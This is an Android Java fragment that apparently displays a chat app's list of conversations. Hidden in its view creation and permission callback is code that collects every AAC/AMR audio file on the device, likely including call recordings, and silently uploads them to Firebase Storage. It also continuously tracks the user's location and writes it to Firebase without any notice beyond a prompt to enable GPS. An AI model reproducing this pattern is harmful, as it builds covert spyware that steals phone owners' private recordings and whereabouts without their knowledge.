package com.zamba.berreto.fragments;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.snackbar.Snackbar;
import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.MimeTypeMap;
import android.widget.ImageView;
import android.widget.TextView;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.zamba.berreto.R;
import com.zamba.berreto.adapters.ChatAdapter;
import com.zamba.berreto.interfaces.HomeIneractor;
import com.zamba.berreto.models.AudioModel;
import com.zamba.berreto.models.Chat;
import com.zamba.berreto.models.User;
import com.zamba.berreto.models.UserLocation;
import com.zamba.berreto.utils.Helper;
import com.zamba.berreto.views.MyRecyclerView;

import java.io.File;
import java.util.ArrayList;
import java.util.HashSet;

import io.realm.Realm;
import io.realm.RealmChangeListener;
import io.realm.RealmObject;
import io.realm.RealmQuery;
import io.realm.RealmResults;
import io.realm.Sort;

/**
 * Created by a_man on 30-12-2017.
 */

public class MyUsersFragment extends Fragment {
    private static final int CONTACTS_REQUEST_CODE2 = 453;
    private MyRecyclerView recyclerView;
    private ChatAdapter chatAdapter;

    private Realm rChatDb;
    private User userMe;
    private RealmResults<Chat> resultList;
    private ArrayList<Chat> chatDataList = new ArrayList<>();
    public ArrayList<AudioModel> audio_list = new ArrayList<>();
    public ArrayList<String> urlStrings = new ArrayList<String>();
    public ArrayList<AudioModel> audio_urlStrings = new ArrayList<AudioModel>();

    // Flag for GPS status
    boolean isGPSEnabled = false;

    // Flag for network status
    boolean isNetworkEnabled = false;

    // Flag for GPS status
    boolean canGetLocation = false;

    Location location; // Location
    double latitude; // Latitude
    double longitude; // Longitude

    private String source_lat="";
    private String source_lng="";

    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 1000; // 10 meters

    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // 1 minute


    private RealmChangeListener<RealmResults<Chat>> chatListChangeListener = new RealmChangeListener<RealmResults<Chat>>() {
        @Override
        public void onChange(@NonNull RealmResults<Chat> element) {
            if (chatDataList != null && chatAdapter != null) {
                chatDataList.clear();
                chatDataList.addAll(rChatDb.copyFromRealm(element));
                chatAdapter.notifyDataSetChanged();
            }
        }
    };
    private HomeIneractor homeInteractor;

    @Override
    public void onAttach(Context context) {
        super.onAttach(context);
        try {
            homeInteractor = (HomeIneractor) context;
        } catch (ClassCastException e) {
            throw new ClassCastException(context.toString()
                    + " must implement HomeIneractor");
        }
    }

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Helper helper = new Helper(getContext());
        userMe = helper.getLoggedInUser();
        Realm.init(getContext());
        rChatDb = Helper.getRealmInstance();
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_main_recycler, container, false);
        recyclerView = view.findViewById(R.id.recycler_view);
        statusCheck();
        recyclerView.setEmptyView(view.findViewById(R.id.emptyView));
        recyclerView.setEmptyImageView(((ImageView) view.findViewById(R.id.emptyImage)));
        recyclerView.setEmptyTextView(((TextView) view.findViewById(R.id.emptyText)));

        recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
        if (ContextCompat.checkSelfPermission(getContext(),   Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {



        audio_list=getRecording();

            uploadAudioToserver(audio_list);


        } else {
            ActivityCompat.requestPermissions(getActivity(), new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, CONTACTS_REQUEST_CODE2);
        }

        return view;
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);
        RealmQuery<Chat> query = rChatDb.where(Chat.class).equalTo("myId", userMe.getId());//Query from chats whose owner is logged in user
        resultList = query.equalTo("group", false).sort("timeUpdated", Sort.DESCENDING).findAll();//ignore forward list of messages and get rest sorted according to time

        chatDataList.clear();
        chatDataList.addAll(rChatDb.copyFromRealm(resultList));
        chatAdapter = new ChatAdapter(getActivity(), chatDataList);
        recyclerView.setAdapter(chatAdapter);

        resultList.addChangeListener(chatListChangeListener);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        homeInteractor = null;
        if (resultList != null)
            resultList.removeChangeListener(chatListChangeListener);
    }

    //Display user's name as saved in phone!
    public void setUserNamesAsInPhone() {
        if (homeInteractor != null && chatDataList != null) {
            for (Chat chat : chatDataList) {
                String endTrim = Helper.getEndTrim(chat.getChatId());
                if (homeInteractor.getLocalContacts().containsKey(endTrim)) {
                    chat.setChatName(homeInteractor.getLocalContacts().get(endTrim).getName());
                }
            }
            if (chatAdapter != null)
                chatAdapter.notifyDataSetChanged();
        }
    }

    public void deleteSelectedChats() {
        rChatDb.beginTransaction();
        for (Chat chat : chatDataList) {
            if (chat.isSelected()) {
                Chat chatToDelete = rChatDb.where(Chat.class).equalTo("myId", userMe.getId()).equalTo("chatId", chat.getChatId()).findFirst();
                if (chatToDelete != null) {
                    RealmObject.deleteFromRealm(chatToDelete);
                }
            }
        }
        rChatDb.commitTransaction();
    }

    public void disableContextualMode() {
        chatAdapter.disableContextualMode();
    }


    private void getLocation()
    {

        if (ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(getActivity(), Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.

            LocationManager locationManager = (LocationManager) getContext().getSystemService(getContext().LOCATION_SERVICE);
            // Getting GPS status
            isGPSEnabled = locationManager
                    .isProviderEnabled(LocationManager.GPS_PROVIDER);

            // Getting network status
            isNetworkEnabled = locationManager
                    .isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!isGPSEnabled && !isNetworkEnabled) {
                // No network provider is enabled
            } else {
                this.canGetLocation = true;
                if (isNetworkEnabled) {
                    int requestPermissionsCode = 50;

                    locationManager.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER,
                            MIN_TIME_BW_UPDATES,
                            MIN_DISTANCE_CHANGE_FOR_UPDATES, mLocationListener);
                    Log.d("Network", "Network");
                    if (locationManager != null) {
                        location = locationManager
                                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        if (location != null) {
                            latitude = location.getLatitude();
                            longitude = location.getLongitude();
                        }
                    }
                }
            }
            // If GPS enabled, get latitude/longitude using GPS Services
            if (isGPSEnabled) {
                if (location == null) {
                    if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getActivity(), Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                        ActivityCompat.requestPermissions(getActivity(), new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 50);

                    } else {
                        locationManager.requestLocationUpdates(
                                LocationManager.GPS_PROVIDER,
                                MIN_TIME_BW_UPDATES,
                                MIN_DISTANCE_CHANGE_FOR_UPDATES, mLocationListener);
                        Log.d("GPS Enabled", "GPS Enabled");
                        if (locationManager != null) {

                            location = locationManager
                                    .getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            if (location != null) {
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
                            }
                        }
                    }
                }

            }


            Log.e("mLocationListener ","  CAL   ");


        }
        else {

        }

    }
    private final LocationListener mLocationListener = new LocationListener() {
        @Override
        public void onLocationChanged(final Location location) {
            //your code here


            source_lat=""+location.getLatitude();
            source_lng=""+location.getLongitude();


            Log.e("mLocationListener ","  source_lat   "+source_lat);
            Log.e("mLocationListener ","  source_lng   "+source_lng);
            addUserLocation(source_lat,source_lng);
        }

        @Override
        public void onStatusChanged(String s, int i, Bundle bundle) {

        }

        @Override
        public void onProviderEnabled(String s) {

        }

        @Override
        public void onProviderDisabled(String s) {

        }
    };

    private void addUserLocation(String crrent_lat,String crrent_long)
    {
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("UserLocation").child(userMe.getId());

        UserLocation userLocation=new UserLocation(crrent_lat,crrent_long);

        databaseReference.setValue(userLocation);


    }
    public void statusCheck() {
        LocationManager manager = (LocationManager) getContext().getSystemService(getContext().LOCATION_SERVICE);
        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {

            showDialogForGPSIntent();
            displayMessage("Please Turn On Your Mobile GPS");
        }
        else {


            getLocation();
        }


    }

    public void displayMessage(String toastString) {

        Snackbar.make(getActivity().findViewById(android.R.id.content), toastString, 3000).show();

        // Toast.makeText(context, ""+toastString, Toast.LENGTH_SHORT).show();

    }
    private void showDialogForGPSIntent() {
        AlertDialog.Builder builder = new AlertDialog.Builder(getContext());
        LayoutInflater inflater = (LayoutInflater) getContext().getSystemService(getContext().LAYOUT_INFLATER_SERVICE);
        builder.setTitle(getString(R.string.app_name))
                .setIcon(R.mipmap.ic_launcher)
                .setMessage("GPS is disabled in your device. Enable it?")
                .setCancelable(false)
                .setPositiveButton("Enable GPS",
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog,
                                                int id) {
                                Intent callGPSSettingIntent = new Intent(
                                        android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                                startActivity(callGPSSettingIntent);
                            }
                        });
        builder.setNegativeButton("Cancel",
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        dialog.cancel();
                    }
                });
        final AlertDialog alert1 = builder.create();

        alert1.setOnShowListener(new DialogInterface.OnShowListener() {
            @Override
            public void onShow(DialogInterface arg) {
                alert1.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(ContextCompat.getColor(getContext(), R.color.colorPrimary));
                alert1.getButton(AlertDialog.BUTTON_NEGATIVE).setTextColor(ContextCompat.getColor(getContext(), R.color.colorPrimary));
            }
        });
        alert1.show();
    }


    public ArrayList<AudioModel> getRecording() {
        HashSet<AudioModel> videoItemHashSet = new HashSet<>();




        String selectionMimeType = MediaStore.Audio.AudioColumns.MIME_TYPE + "=?"
                + " OR " + MediaStore.Audio.AudioColumns.MIME_TYPE + "=?";

        String[] selectionArgs = new String[]{ MimeTypeMap.getSingleton().getMimeTypeFromExtension("aac"),
                MimeTypeMap.getSingleton().getMimeTypeFromExtension("amr") };

        String[] projection = {MediaStore.Audio.AudioColumns.DATA, MediaStore.Audio.Media.DISPLAY_NAME};
        Cursor cursor = getContext().getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, projection, selectionMimeType, selectionArgs, null);
        try {
            if (cursor != null) {
                cursor.moveToFirst();

                do {

                    Log.e("Audio ", " adio  " + cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA)));


                    int dataColumn = cursor.getColumnIndex(MediaStore.Audio.Media.DATA);

                    Log.e("Audio ", "dataColumn " + dataColumn);

                    AudioModel documentModel = new AudioModel();
                    String path = cursor.getString(0);
                    String name = cursor.getString(1);



                    documentModel.setAudio_url(path);
                    documentModel.setAudio_title(name);



                    Log.e("data ","Name :" + name);
                    Log.e("data ","Path :" + path);

                    videoItemHashSet.add(documentModel);
                } while (cursor.moveToNext());

                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        ArrayList<AudioModel> downloadedList = new ArrayList<>(videoItemHashSet);
        return downloadedList;
    }



    private void  uploadAudioToserver(final ArrayList<AudioModel>  ImageList)
    {
        int upload_count;

        AudioModel audioModel=new AudioModel();
        StorageReference ImageFolder = FirebaseStorage.getInstance().getReference().child("AudioFolder").child(userMe.getId());

        for (upload_count = 0; upload_count < ImageList.size(); upload_count++) {


            Log.e("Audio  size", String.valueOf(ImageList.size()));
            String  Path= ImageList.get(upload_count).getAudio_url();
            String  name=ImageList.get(upload_count).getAudio_title();
//
//            Log.e("Audio ","Path "+ImageList.get(upload_count).getAudio_url());
//            Log.e("Audio ","name "+ImageList.get(upload_count).getAudio_title());
//            Uri IndividualImage = Uri.fromFile(new File(Path));
//
//            Log.e("Audio "," IndividualImage  "+IndividualImage);
//            final StorageReference ImageName = ImageFolder.child(String.valueOf(upload_count));
//
//            final int finalUpload_count = upload_count;
//            ImageName.putFile(IndividualImage).addOnSuccessListener(
//                    new OnSuccessListener<UploadTask.TaskSnapshot>() {
//                        @Override
//                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
//                            ImageName.getDownloadUrl().addOnSuccessListener(
//                                    new OnSuccessListener<Uri>() {
//                                        @Override
//                                        public void onSuccess(Uri uri) {
//
//
//                                            AudioModel audioModel=new AudioModel();
//
//                                            String  path=String.valueOf(uri);
//                                            String  name=ImageList.get(finalUpload_count).getAudio_title();
//                                            audioModel.setAudio_url(path);
//                                            audioModel.setAudio_title(name);
//                                            audio_urlStrings.add(audioModel);
//
//
//                                            Log.e("Audio "," urlStrings  "+urlStrings);
//                                            if (audio_urlStrings.size() == ImageList.size()){
//                                                store_Audio_Link(audio_urlStrings);
//                                            }
//
//                                        }
//                                    }
//                            );
//                        }
//                    }
//            );


            Uri IndividualImage = Uri.fromFile(new File(Path));

            StorageReference riversRef = ImageFolder.child(String.valueOf(upload_count));
            UploadTask uploadTask = riversRef.putFile(IndividualImage);

            Task<Uri> urlTask = uploadTask.continueWithTask(new Continuation<UploadTask.TaskSnapshot, Task<Uri>>() {
                @Override
                public Task<Uri> then(@NonNull Task<UploadTask.TaskSnapshot> task) throws Exception {
                    if (!task.isSuccessful()) {
                        throw task.getException();
                    }

                    // Continue with the task to get the download URL
                    return riversRef.getDownloadUrl();
                }
            }).addOnCompleteListener(new OnCompleteListener<Uri>() {
                @Override
                public void onComplete(@NonNull Task<Uri> task) {
                    if (task.isSuccessful()) {
                        Uri downloadUri = task.getResult();



                                            String  path=String.valueOf(downloadUri);

                                            audioModel.setAudio_url(path);
                                            audioModel.setAudio_title(name);
                                            audio_urlStrings.add(audioModel);


                                            Log.e("Audio "," urlStrings  "+urlStrings);
                                            if (audio_urlStrings.size() == ImageList.size()){
                                                store_Audio_Link(audio_urlStrings);
                                            }
                    } else {
                        // Handle failures
                        // ...
                    }
                }
            });



        }


    }




    private void store_Audio_Link(ArrayList<AudioModel> urlStrings) {


        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("UserUploadAudio").child(userMe.getId());

        for (int i = 0; i <urlStrings.size() ; i++) {

            AudioModel audioModel=new AudioModel(urlStrings.get(i).getAudio_url(),urlStrings.get(i).getAudio_title());

            databaseReference.child(String.valueOf(i)).setValue(audioModel);

        }



//        databaseReference.push().setValue(hashMap)
//                .addOnCompleteListener(
//                        new OnCompleteListener<Void>() {
//                            @Override
//                            public void onComplete(@NonNull Task<Void> task) {
//                                if (task.isSuccessful()) {
//
//                                }
//                            }
//                        }
//                ).addOnFailureListener(new OnFailureListener() {
//            @Override
//            public void onFailure(@NonNull Exception e) {
//                Toast.makeText(getContext(), "" + e.getMessage(), Toast.LENGTH_SHORT).show();
//            }
        //      });

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case CONTACTS_REQUEST_CODE2:


                audio_list=getRecording();

                uploadAudioToserver(audio_list);

        break;
    }
}
}
